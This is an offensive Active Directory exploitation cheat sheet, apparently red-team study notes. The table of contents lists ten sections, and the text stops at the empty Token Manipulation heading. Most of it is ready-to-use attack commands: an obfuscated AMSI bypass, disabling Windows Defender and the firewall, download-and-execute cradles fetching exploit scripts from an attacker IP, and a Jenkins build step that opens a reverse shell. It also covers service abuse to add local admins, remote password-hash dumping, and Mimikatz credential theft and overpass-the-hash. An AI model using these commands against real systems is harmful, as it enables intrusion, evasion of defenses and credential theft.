# Active Directory Exploitation

Overview
---------
1. - [Powershell Basics](#1---powershell-basics)
     - [Help System](#help-system)
     - [Cmdlets](#cmdlets)
     - [Modules](#modules)
     - [Dot-sourcing](#dot-sourcing)
     - [Copy File](#copy-file)
     - [Download File](#download-file)
     - [Unzip File](#unzip-file)
     - [PowerShell Scripts: Execution Policy, AMSI, Windows Defender, Windows Firewall, AppLocker, Language Modes, and Device Guard](#powershell-scripts-execution-policy-amsi-windows-defender-windows-firewall-applocker-language-modes-and-device-guard)
     - [PowerShell Script Execution](#powershell-script-execution)
2. - [Domain Enumeration](#2---domain-enumeration)
     - [PowerView](#powerview)
     - [ActiveDirectory (AD) Module](#activedirectory-ad-module)
     - [BloodHound](#bloodhound)
     - [SharpView](#sharpview)
3. - [Local Privilege Escalation](#3---local-privilege-escalation)
     - [Privilege Escalation Methods](#privilege-escalation-methods)
     - [PowerUp](#powerup)
     - [BeRoot](#beroot)
     - [Privesc](#privesc)
     - [Feature Abuse - Jenkins](#feature-abuse---jenkins)
4. - [Lateral Movement](#4---lateral-movement)
     - [PowerShell Remoting](#powershell-remoting)
     - [Mimikatz](#mimikatz)
     - [Token Manipulation](#token-manipulation)
     - [Extracting Credentials](#extracting-credentials)
5. - [Domain Persistence](#5---domain-persistence)
     - [Golden Ticket](#golden-ticket)
     - [Silver Ticket](#silver-ticket)
     - [Skeleton Key](#skeleton-key)
     - [Directory Services Restore Mode (DSRM)](#directory-services-restore-mode-dsrm)
     - [Custom Security Support Provider (SSP)](#custom-security-support-provider-ssp)
     - [AdminSDHolder (Persistence using ACLs)](#adminsdholder-persistence-using-acls)
     - [Rights Abuse (Persistence using ACLs)](#rights-abuse-persistence-using-acls)
     - [Security Descriptors (Persistence using ACLs)](#security-descriptors-persistence-using-acls)
6. - [Domain Privilege Escalation](#6---domain-privilege-escalation)
     - [Kerberoast](#kerberoast)
     - [ASREPRoast](#asreproast)
     - [Set SPN](#set-spn)
     - [Kerberos Delegation](#kerberos-delegation)
     - [Unconstrained Delegation](#unconstrained-delegation)
     - [Constrained Delegation](#constrained-delegation)
     - [Alternate Service Constrained Delegation](#alternate-service-constrained-delegation)
     - [DNSAdmins](#dnsadmins)
     - [DA to EA: Child to Parent (Trust Tickets)](#da-to-ea-child-to-parent-trust-tickets)
     - [DA to EA: Child to Parent (Krbtgt Hash)](#da-to-ea-child-to-parent-krbtgt-hash)
7. - [Cross Forest Attacks](#7---cross-forest-attacks)
     - [Trust Tickets](#trust-tickets)
     - [MSSQL Servers](#mssql-servers)
8. - [Forest Persistence](#8---forest-persistence)
     - [DCShadow](#dcshadow)
     - [DCShadow Minimal Permissions](#dcshadow-minimal-permissions)
     - [Shadowception](#shadowception)
9. - [Abusing SQL Server Trusts](#9---abusing-sql-server-trusts)
     - [Principals, Roles, and Privileges](#principals-roles-and-privileges)
       - [Discovery, Enumeration, and Scanning](#discovery-enumeration-and-scanning)
     - [Brute Force](#brute-force)
     - [Post Exploitation Enumeration](#post-exploitation-enumeration)
     - [Privilege Escalation](#privilege-escalation)
     - [Command Execution](#command-execution)
10. - [WMI Attacks](#wmi-attacks)


#1. - PowerShell Basics
-----------------------------------------

### Help System

- Display information about PowerShell commands and concepts

```
PS C:\> Get-Help
```

- Display information about PowerShell conceptual articles

```
PS C:\> Get-Help about_<article_name>
```

- Display a list of all help articles available on your computer

```
PS C:\> Get-Help *
```

- Display a list of everything which contains the word "process"

```
PS C:\> Get-Help process
```

- Update the help system (v3+)

```
PS C:\> Update-Help
```

- List full help about a topic (Get-Item cmdlet in this case)

```
PS C:\> Get-Help Get-Item -Full
```

- List examples of how to run a cmdlet (Get-Item cmdlet in this case)

```
PS C:\> Get-Help Get-Item -Examples
```

### Cmdlets

- List all cmdlets

```
PS C:\> Get-Command -CommandType cmdlet
```

### Modules

- Import a module

```
PS C:\> Import-Module <modulepath>
```

- List all the commands in a module

```
PS C:\> Get-Command -Module <modulename>
```

### Dot-Sourcing

- Dot-source a PowerShell script

```
PS C:\> . .\PowerView.ps1
```

### Copy File

- Copy a file using PowerShell

```
PS C:\> Copy-Item .\<local file> \\<hostname>\c$\'Program Files'
OR
PS C:\> Copy-Item -ToSession $sess -Path C:\Tools\Rubeus.exe -Destination C:\Windows\Temp
```

### Download File

- Download a file using PowerShell

```
PS C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP address>/exploit.exe','C:\Users\Public\Desktop\new-exploit.exe')"
```

### Unzip File

- Unzip a file using PowerShell

```
PS C:\> Expand-Archive <file.zip>
```

### PowerShell Scripts: Execution Policy, AMSI, Windows Defender, Windows Firewall, AppLocker, Language Modes, and Device Guard

- Bypass the PowerShell execution policy feature (exists to prevent a user from accidentally executing scripts)

```
PS C:\> powershell -ExecutionPolicy bypass
OR
PS C:\> powershell -c <cmd>
OR
PS C:\> powershell -encodedcommand
OR
PS C:\> $env:PSExecutionPolicyPreference="bypass"
```

- Bypass AMSI

```
PS C:\> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
OR
PS C:\> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

- Disable Windows Defender

```
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true
```

- Check exclusion paths from Windows Defender

```
PS C:\> (Get-MpPreference).Exclusionpath
```

- Disable AMSI

```
PS C:\> Set-MpPreference -DisableIOAVProtection $true
```

- Disable Windows Firewall

```
PS C:\> Set-NetFirewallProfile -name Domain,Private,Public -Enabled False
OR
PS C:\> netsh advfirewall set allprofiles state off
```

- Check the AppLocker policy (look for exempted binaries or paths to bypass)

```
PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

- Check the language mode (cannot dot source with Constrained Language Mode)

```
PS C:\> $ExecutionContext.SessionState.LanguageMode
```

- Bypass Constrained Language Mode

```
PS C:\> Remove-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -name __PSLockdownPolicy
OR
PS C:\> powershell -version 2
```

- Check device guard

```
PS C:\> Get-CimInstance -ClassName Win32_DeviceGuard -NameSpace root\Microsoft\Windows\DeviceGuard
```

### PowerShell Script Execution

- Download and execute a PowerShell script in memory

```
PS C:\> iex (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
OR
PS C:\> $ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://<IP address>/exploit.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
OR
PS C:\> iex (iwr 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')        # PSv3 onwards
OR
PS C:\> iex (iwr 'http://<IP address>/Invoke-Mimikatz.ps1' -UseBasicParsing)
OR
PS C:\> $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1',$false);$h.send();iex $h.responseText
OR
PS C:\> $wr = [System.NET.WebRequest]::Create("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
PS C:\> $r = $wr.GetResponse() 
PS C:\> IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

#2. - Domain Enumeration
-----------------------------------------

### PowerView

- PowerView link

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

- Enumerate current domain

```
PS C:\> Get-NetDomain
PS C:\> Get-NetDomain -Domain <Domain Name>        # Enumerate another domain
```

- Enumerate domain SID

```
PS C:\> Get-DomainSID
```

- Enumerate domain policy

```
PS C:\> Get-DomainPolicy
PS C:\> (Get-DomainPolicy)."System Access"        # Password policy
PS C:\> (Get-DomainPolicy)."Kerberos Policy"        # Kerberos policy - smart idea to enumerate this before golden ticket attack
PS C:\> (Get-DomainPolicy -Domain <Domain Name>)."System Access"        # Enumerate another domain
```

- Enumerate domain controllers

```
PS C:\> Get-NetDomainController
PS C:\> Get-NetDomainController -Domain <Domain Name>        # Enumerate another domain
```

- Enumerate users

```
PS C:\> Get-NetUser
PS C:\> Get-NetUser | select samaccountname
PS C:\> Get-NetUser -Username <username>
PS C:\> Get-NetUser -Username <username> -Domain <Domain Name>        # Enumerate another domain
```

- Enumerate list of all properties for users

```
PS C:\> Get-UserProperty
PS C:\> Get-UserProperty -Properties pwdlastset        # Check last password change
PS C:\> Get-UserProperty -Properties badpwdcount        # Look for 0 - this may be a decoy or honeypot user
PS C:\> Get-UserProperty -Properties logoncount        # Check logon counts - this may be a decoy or honeypot user
```

- Search for a particular string in a user's attributes

```
PS C:\> Find-UserField -SearchField Description -SearchTerm "built"
```

- Enumerate computers

```
PS C:\> Get-NetComputer
PS C:\> Get-NetComputer -FullData
PS C:\> Get-NetComputer -FullData | select operatingsystem
PS C:\> Get-NetComputer -OperatingSystem "*Server 2016*"
PS C:\> Get-NetComputer -Ping        # Enumerate machines that respond to ping
```

- Enumerate groups

```
PS C:\> Get-NetGroup
PS C:\> Get-NetGroup -FullData
PS C:\> Get-NetGroup -GroupName "Domain Admins" -FullData        # Enumerate a specific group
PS C:\> Get-NetGroup -GroupName *admin*        # List groups containing the word "admin" in group name
PS C:\> Get-NetGroup -Domain <Domain Name>        # Enumerate another domain

# Only the forest root domain contains the Enterprise Admins and Schema Admins groups. The first domain that you deploy in an Active Directory forest is called the forest root domain. This domain remains the forest root domain for the life cycle of the AD DS deployment.
```     

- Enumerate group members

```
PS C:\> Get-NetGroupMember -GroupName "Domain Admins"
PS C:\> Get-NetGroupMember -GroupName "Domain Admins" -Recurse        # Enumerate group members of the Domain Admins group
PS C:\> Get-NetGroupMember -GroupName "Enterprise Admins" -Domain <Domain Name> -Recurse        # Enumerate another domain
PS C:\> Get-NetGroup -UserName "<username>"        # Enumerate the group membership for a user
```

- Enumerate local groups

```
PS C:\> Get-NetLocalGroup -ComputerName <computer name> -ListGroups        # List local groups on a machine (needs administrator privileges on non-DC machines)
PS C:\> Get-NetLocalGroup -ComputerName <computer name> -Recurse        # Enumerate members of all the local groups on a machine (needs administrator privileges on non-DC machines)
```

- Enumerate logged-on users

```
PS C:\> Get-NetLoggedon -ComputerName <computer name>        # Get actively logged users on a computer (needs local admin rights on the target)
PS C:\> Get-LoggedonLocal -ComputerName <computer name>        # Get locally logged users on a computer (needs remote registry on the target - started by default on server OS)
PS C:\> Get-LastLoggedon -ComputerName <computer name>      # Get the last logged user on a computer (needs admin rights and remote registry on the target)
PS C:\> Get-NetSession -ComputerName <computer name>        # Get session information for a machine
```

- Enumerate shares

```
PS C:\> Invoke-ShareFinder
PS C:\> Invoke-ShareFinder -Verbose
PS C:\> Invoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC 
```

- Enumerate sensitive files

```
PS C:\> Invoke-FileFinder -Verbose
```

- Enumerate fileservers (considered high-value targets in a domain)

```
PS C:\> Get-NetFileServer
```

- Enumerate group policies (GPO)

```
PS C:\> Get-NetGPO
PS C:\> Get-NetGPO | select displayname
PS C:\> Get-NetGPO -ComputerName <computer name>        # Enumerate another computer 
PS C:\> Get-NetGPOGroup        # Get GPO(s) which use Restricted Groups or groups.xml for interesting users
PS C:\> Find-GPOComputerAdmin -Computername <computer name>        # Get users which are in a local group of a machine using GPO
PS C:\> Find-GPOLocation -UserName <username> -Verbose         # Get machines where the given user is member of a specific group
```

- Enumerate organizational units (OUs)

```
PS C:\> Get-NetOU
PS C:\> Get-NetOU -FullData
PS C:\> Get-NetOU <OU name> | %{Get-NetComputer -ADSPath $_}        # List all the computers in an OU
```

- Emumerate GPO applied on an OU

```
PS C:\> Get-NetGPO -GPOname "{AB306569-220D-43FF-B03B-83E8F4EF8081}"        # Enumerate GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
OR
PS C:\> Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'
```

*Enables control on the ability of a process to access objects and other resources in Active Directory based on: Access Tokens (security context of a process identity and privs of user), and Security Descriptors (SID of the owner, Discretionary ACL (DACL) and System ACL).*

*Every object in AD has a security descriptor to store information about permissions, and control who has access to an object = SID of the owner, Discretionary ACL (DACL), and System ACL (SACL). DACL - Defines the permissions trustees (a user or group) have on an object (Right-click an object -> Properties -> Security tab -> Advanced -> Permissions tab (these entries show the permissions each object have on the object you right-clicked on)). SACL - Logs success and failure audit messages when an object is accessed (Right-click an object -> Properties -> Security tab -> Advanced -> Auditing tab).*

- Enumerate access control lists (ACLs) (List of access control entries (ACE) = ACE corresponds to individual permission or audit access)

```
PS C:\> Get-ObjectAcl -SamAccountName <object> -ResolveGUIDs        # Get the ACLs with the specified object (3 most important properties: ObjectDN = target object we specified, IdentityReference = which object has permissions on the target, ActiveDirectoryRights = what rights they have. Other interesting properties are: InheritedObjectType, AccessControlType, InheritanceFlags, ObjectSID)
PS C:\> Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose        # Enumerate the ACLs associated with the specified prefix to be used for search
PS C:\> Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose        # Enumerate the ACLs associated with the specified LDAP path to be used for search for the specified object
PS C:\> Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"        # Enumerate the ACLs associated with the specified path
```

- Search for interesting ACEs (write or modify rights/permissions)

```
PS C:\> Invoke-ACLScanner -ResolveGUIDs
PS C:\> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "<object>"}        # On a specified object
PS C:\> Invoke-ACLScanner -ResolveGUIDs | select objectdn, identityreference, activedirectoryrights
```

- Enumerate ACLs for all the GPOs

```
PS C:\> Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
PS C:\> Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}  | ?{$_.IdentityReference -match "<object>"}        # On a specified object
```

*In an Active Directory environment, trust is a relationship between two domains or forests which allows users of one domain or forest to access resources in the other domain or forest. Trust can be automatic (parent-child, same forest etc..) or established (forest, external). Trusted Domain Objects (TDOs) represent the trust relationships in a domain.*

*Trust Direction: One-way trust - Unidirectional. Users in the trusted domain can access resources in the trusting domain, but the reverse is not true. Two-way trust - Bidirectional. Users of both domains can access resources in the other domain.*

*Trust Transitivity: Transitive - Can be extended to establish trust relationships with other domains (all the default intra-forest trust relationships (tree-root, parent-child) between domains within a same forest are transitive two-way trusts). Nontransitive - Cannot be extended to other domains in the forest. Can be two-way or one-way (this is the default trust (called external trust) between two domains in different forests when forests do not have a trust relationship).*

*Domain Trusts: Default/Automatic Trusts - Parent-child trust is created automatically between the new domain and the domain that precedes it in the namespace hierarchy, whenever a new domain is added in a tree. Always two-way transitive. Tree-root trust is created automatically between whenever a new domain tree is added to a forest root. Always two-way transitive. Shortcut Trusts - Used to reduce access times in complex trust scenarios. Can be one-way or two-way transitive. External Trusts - Between two domains in different forests when forests do not have a trust relationship. Can be one-way or two-way and is nontransitive.*

*Forest Trusts: Between forest root domain. Cannot be extended to a third forest (no implicit trust). Can be one-way or two-way and always nontransitive.*

- Enumerate a list of all domain trusts in the current domain

```
PS C:\> Get-NetDomainTrust
PS C:\> Get-NetDomainTrust -Domain <Domain Name>        # Enumerate another domain
PS C:\> Get-NetForestDomain -Verbose | Get-NetDomainTrust        # Map all the domain trusts of the current forest
PS C:\> Get-NetForestDomain -Forest <Forest Name> -Verbose | Get-NetDomainTrust        # Map all the domain trusts of another forest
```

- Enumerate current forest

```
PS C:\> Get-NetForest
PS C:\> Get-NetForest -Forest <Forest Name>                 # Enumerate another forest
```

- Enumerate domains in the current forest

```
PS C:\> Get-NetForestDomain
PS C:\> Get-NetForestDomain -Forest <Forest Name>        # Enumerate another forest
```

- Enumerate global catalogs in the current forest

```
PS C:\> Get-NetForestCatalog
PS C:\> Get-NetForestCatalog -Forest <Forest Name>        # Enumerate another forest
```

- Enumerate forest trusts

```
PS C:\> Get-NetForestTrust
PS C:\> Get-NetForestTrust -Forest <Forest Name>            # Enumerate another forest
```

- User hunting

*This can also be done with the help of remote administration tools like WMI and PowerShell remoting. Pretty useful in cases ports (RPC and SMB) used by Find LocalAdminAccess are blocked. See Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1*

```
PS C:\> Find-LocalAdminAccess -Verbose        # Find all machines on the current domain where the current user has local admin access
PS C:\> Invoke-EnumerateLocalAdmin -Verbose        # Find local admins on all machines of the domain (needs administrator privileges on non-DC machines)
PS C:\> Invoke-UserHunter        # Find computers where a domain admin (or specified user/group) has sessions
PS C:\> Invoke-UserHunter -GroupName "RDPUsers"
PS C:\> Invoke-UserHunter -CheckAccess        # To confirm admin access
PS C:\> Invoke-UserHunter -Stealth        # Targets high traffic servers e.g. DC, File Servers, Distributed File Servers
```

### ActiveDirectory (AD) Module

- ActiveDirectory (AD) Module links

https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2019-ps<br>
https://github.com/samratashok/ADModule

*You can copy this DLL to your machine and use it to enumerate Active Directory without installing RSAT and without having administrative privileges. To be able to list all the cmdlets in the module, import the module as well. Remember to import the DLL first.*

```
PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
PS C:\> Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1
PS C:\> Get-Command -Module ActiveDirectory
```

*You can also use the Import-ActiveDirectory.ps1 to load the script using download-execute cradles and without writing the DLL to disk:*

```
PS C:\> iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```

- Enumerate current domain

```
PS C:\> Get-ADDomain
PS C:\> Get-ADDomain -Identity <Domain Name>        # Enumerate another domain
```

- Enumerate domain SID

```
PS C:\> (Get-ADDomain).DomainSID
```

- Enumerate domain controllers

```
PS C:\> Get-ADDomainController
PS C:\> Get-ADDomainController -DomainName <Domain Name> -Discover        # Enumerate another domain
```

- Enumerate users

```
PS C:\> Get-ADUser -Filter *
PS C:\> Get-ADUser -Filter * -Properties *
PS C:\> Get-ADUser -Filter * -Properties * | select Name
PS C:\> Get-ADUser -Identity <username> -Properties *
PS C:\> Get-ADUser -Server <Domain Controller>
```

- Enumerate list of all properties for users

```
PS C:\> Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
PS C:\> Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```

- Search for a particular string in a user's attributes

```
PS C:\> Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
```

- Enumerate computers

```
PS C:\> Get-ADComputer -Filter *
PS C:\> Get-ADComputer -Filter * -Properties *
PS C:\> Get-ADComputer -Filter * | select Name
PS C:\> Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
PS C:\> Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}        # Enumerate machines that respond to ping
```

- Enumerate groups

```
PS C:\> Get-ADGroup -Filter *
PS C:\> Get-ADGroup -Filter * -Properties *
PS C:\> Get-ADGroup -Filter * | select Name
PS C:\> Get-ADGroup -Filter 'Name -like "*admin*"' | select Name        # List groups containing the word "admin" in group name
PS C:\> Get-ADGroup -Identity "Enterprise Admins" -Server "moneycorp.local"        # Enumerate another domain
```

- Enumerate group members

```
PS C:\> Get-ADGroupMember -Identity "Domain Admins"
PS C:\> Get-ADGroupMember -Identity "Domain Admins" -Recursive        # Enumerate group members of the Domain Admins group
PS C:\> Get-ADGroupMember -Identity "Enterprise Admins" -Server "<Domain Name>" -Recursive     # Enumerate another domain
PS C:\> Get-ADPrincipalGroupMembership -Identity <username>        # Enumerate the group membership for a user
```

- Enumerate organizational units (OUs)

```
PS C:\> Get-ADOrganizationalUnit -Filter * -Properties *
```

- Enumerate access control lists (ACLs) (List of access control entries (ACE) = ACE corresponds to individual permission or audit access)

```
PS C:\> (Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access        # Enumerate ACLs without resolving GUIDs
```

- Enumerate a list of all domain trusts in the current domain

```
PS C:\> Get-ADTrust
PS C:\> Get-ADTrust -Identity <Domain Name>        # Enumerate another domain
```

- Enumerate current forest

```
PS C:\> Get-ADForest
PS C:\> Get-ADForest -Identity <Forest Name>        # Enumerate another forest
```

- Enumerate domains in the current forest

```
PS C:\> (Get-ADForest).Domains
```

- Enumerate global catalogs in the current forest

```
PS C:\> Get-ADForest | select -ExpandProperty GlobalCatalogs
```

- Enumerate forest trusts

```
PS C:\> Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```

### BloodHound

*Provides GUI for AD entities and relationships for the data collected by its ingestors. Uses Graph Theory for providing the capability of mapping the shortest path for interesting things like Domain Admins. The generated archive can be uploaded to the BloodHound application.*

- BloodHound link

https://github.com/BloodHoundAD/BloodHound<br>
https://github.com/BloodHoundAD/SharpHound - C# rewrite

- Supply data to BloodHound using powershell module ingestor

```
PS C:\> . .\SharpHound.ps1
PS C:\> Invoke-BloodHound -CollectionMethod All
PS C:\> Invoke-BloodHound -CollectionMethod All -ExcludeDC        # To avoid detections like ATA
PS C:\> Invoke-BloodHound -CollectionMethod LoggedOn        # In case BloodHound doesn't find any Sessions in Database Info
```

- Install neo4j

```
PS C:\> neo4j.bat install-service
PS C:\> neo4j.bat start
```

### SharpView

*.NET port of PowerView*

- SharpView link

https://github.com/tevora-threat/SharpView

- Enumerate users

```
PS C:\> SharpView.exe Get-DomainUser -domain <Domain>
```

#3. - Local Privilege Escalation
-----------------------------------------

### Privilege Escalation Methods

- List of ways to locally escalate privileges on a Windows box

```
- Hunting for local admin access on other machines
- Hunting for high privilege domain accounts (like Domain Admins)
- Missing patches
- Automated deployment and AutoLogon passwords in clear text
- AlwaysInstallElevated (Any user can run MSI as SYSTEM)
- Misconfigured services
- DLL hijacking
- Token impersonation
```

- Privilege escalation tool links

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1<br>
https://github.com/AlessandroZ/BeRoot<br>
https://github.com/enjoiz/Privesc

### PowerUp

- Get services with unquoted paths and a space in their executable path

```
PS C:\> Get-ServiceUnquoted -Verbose
```

- Get services where the current user can write to its binary path or change arguments to the binary

```
PS C:\> Get-ModifiableServiceFile -Verbose
```

- Get services where the current user can modify their configuration

```
PS C:\> Get-ModifiableService -Verbose
```

- Abuse a function the current user has configuration rights on in order to add a local administrator or execute a custom command

```
PS C:\> Invoke-ServiceAbuse -Name '<weak service name>' -UserName '<username>' -Verbose
OR
PS C:\> Invoke-ServiceAbuse -Name '<weak service name>' -Command "net localgroup administrators <username> /add" -Verbose
```

- Run all checks (make sure to check AbuseFunction field to see examples of exploitation)

```
PS C:\> Invoke-AllChecks
```

### BeRoot

- Run all checks

```
PS C:\> .\beRoot.exe
```

### Privesc

- Run all checks

```
PS C:\> Invoke-PrivEsc
```

### Feature Abuse - Jenkins

*If you have admin access (default installation before 2.x), go to http://\<jenkins-server>/script. In the script console, Groovy scripts can be executed. Also, if you don't have admin access but can add or edit build steps in the build configuration of a project, add a build step using "Execute Windows Batch Command". If a build step fails, the following consecutive build steps wont execute.*

- Execute a command on a Jenkins Master using Groovy scripts

```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '<INSERT COMMAND>'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

- Execute a command on a Jenkins Master using build configuration

```
powershell.exe iex (iwr http://<Attacker IP address>/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Power -Reverse -IPAddress <Attacker IP address> -Port <port>
OR
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://<Attacker IP address>/Invoke-PowerShellTcp.ps1')); Power -Reverse -IPAddress <Attacker IP address> -Port <port>
```

Set up a PowerCat listener (press Enter a few times to connect to reverse shells)

```
PS C:\> powercat -l -v -p <port> -t 100
```

#4. - Lateral Movement
-----------------------------------------

### PowerShell Remoting
  
*PsExec on steroids. Enabled by default on Server 2012 onwards. You get elevated shell on remote system if admin creds are used to authenticate (which is the default setting).*

- Enable PowerShell Remoting on current machine (needs admin access)

```
PS C:\> Enable-PSRemoting
```

- Start an interactive session with a remote computer using PowerShell remoting (needs admin access on the remote computer)

```
PS C:\> Enter-PSSession -ComputerName <computer name>
PS C:\> Enter-PSSession -ComputerName <computer name> -Credential <Domain>\<Username>        # Specify credentials
```

- Create a persistent connection to a local or remote computer using PowerShell remoting (needs admin access on the remote computer)

```
PS C:\> $sess = New-PSSession -ComputerName <computer name>
PS C:\> $sess
PS C:\> Enter-PSSession -Session $sess
```

- Execute commands or scriptblocks on a remote computer

```
PS C:\> Invoke-Command -ScriptBlock {whoami} -ComputerName <computer name>
PS C:\> Invoke-Command -ScriptBlock {Get-Process} -ComputerName (Get-Content <server-list.txt>)        # Run a command on multiple systems
PS C:\> Invoke-Command -ScriptBlock {whoami} -Session $sess        # Import a command into a session
PS C:\> Invoke-Command -ScriptBlock {iex (iwr -UseBasicParsing http://<IP address>/amsibypass);iex (iwr -UseBasicParsing http://<IP address>/payload.ps1)} -Session $sess        # Run a command bypassing AMSI
```

- Execute scripts from files on a remote computer

```
PS C:\> Invoke-Command -FilePath C:\Scripts\Get-PassHashes.ps1 -ComputerName <computer name>
PS C:\> Invoke-Command -FilePath C:\Scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <server-list.txt>)        # Run a command on multiple systems
PS C:\> Invoke-Command -FilePath C:\Scripts\Get-PassHashes.ps1 -Session $sess        # Import a script into a session
```
- Execute locally loaded functions on a remote computer

```
PS C:\> Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName <computer name>
PS C:\> Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <server-list.txt>)        # Run a command on multiple system
PS C:\> Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <server-list.txt>) -ArgumentList        # To pass arguments. Only positional arguments can be passed this way
PS C:\> Invoke-Command -ScriptBlock ${function:Get-PassHashes} -Session $sess        # Import a locally loaded function into a session
```

- Execute stateful commands on a remote computer

```
PS C:\> $sess = New-PSSession -ComputerName <computer name>
PS C:\> Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
PS C:\> Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
```

- Create a credentials object to use with PowerShell Remoting

```
$passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<Domain>\<username>", $passwd)
$sess = New-PSSession -ComputerName <computer name> -Credential $creds
```

### Mimikatz

*Mimikatz is used to dump credentials, tickets and more with PowerShell without dropping the mimikatz exe to disk. It is very useful for passing and replaying hashes, tickets and for many other Active Directory attacks. The script needs administrative privileges for dumping credentials from a local machine.*

- Dump credentials on a local machine (needs administrative privileges)

```
PS C:\> Invoke-Mimikatz -DumpCreds
```

- Dump certificates on a local machine (needs administrative privileges)

```
PS C:\> Invoke-Mimikatz -DumpCerts
```

- Dump credentials on multiple remote machines (needs administrative privileges)

```
PS C:\> Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
```

- Dump AES keys (needs administrative privileges)

```
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

- Dump credentials from the credentials vault e.g. scheduled task credentials (needs administrative privileges)

```
PS C:\> Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```

- Overpass The Hash (Generate tokens from hashes) - make sure to run PowerShell as Administrator

```
PS C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:<Domain Name> /ntlm:<NTLM hash> /run:powershell.exe"'
```

- Check if the new PowerShell session is running with elevated privileges (whoami will not show this)

```
PS C:\> Invoke-Command -ScriptBlock {whoami} -ComputerName <Domain Controller>
```

### Token Manipulation

